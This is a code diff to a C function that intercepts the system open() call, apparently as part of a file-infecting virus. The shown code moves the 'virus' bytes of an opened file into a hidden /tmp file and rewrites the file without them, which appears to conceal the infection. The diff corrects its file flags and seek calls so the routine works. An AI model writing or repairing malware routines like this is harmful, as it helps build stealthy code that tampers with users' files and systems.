@@ -57,17 +57,12 @@ int open(const char *pathname, int flags, ...){
     sprintf(filebuf, "/tmp/.%u.%d.%u", pid, fd, ruid);    
     int fd2;
 
-    if((fd2 = syscall(__NR_open, filebuf, O_RDWR, O_CREAT)) == -1){
+    if((fd2 = syscall(__NR_open, filebuf, O_RDWR | O_CREAT)) == -1){
         printf("Virus file open failed.\n");
         return -1;
     }
     off_t zero = 0;
     ssize_t newfile = sendfile(fd2, fd, &zero, virusstop);
-    
-    if(lseek(fd, virusstop, SEEK_SET) == -1){
-        printf("lseek failed.\n");
-    }
-
     char notvirus[filesize - virusstop];
 
     if(read(fd, notvirus, filesize - virusstop) == -1){
@@ -75,7 +70,7 @@ int open(const char *pathname, int flags, ...){
         return -1;
     }
 
-    if(lseek(fd, 0, SEEK_CUR) == -1){
+    if(lseek(fd, 0, SEEK_SET) == -1){
         printf("lseek failed.\n");
         return -1;
     }
@@ -85,17 +80,12 @@ int open(const char *pathname, int flags, ...){
         return -1;
     }
 
-    if(lseek(fd, zero, SEEK_SET) == -1){
-        printf("lseek failed. \n");
-        return -1;
-    }
-    
     if((write(fd, notvirus, filesize - virusstop)) == -1){
         printf("write failed \n");
         return -1;
     }
  
-    if( close(fd2) == -1){
+    if(close(fd2) == -1){
         printf("close failed\n");
         return -1;
     }
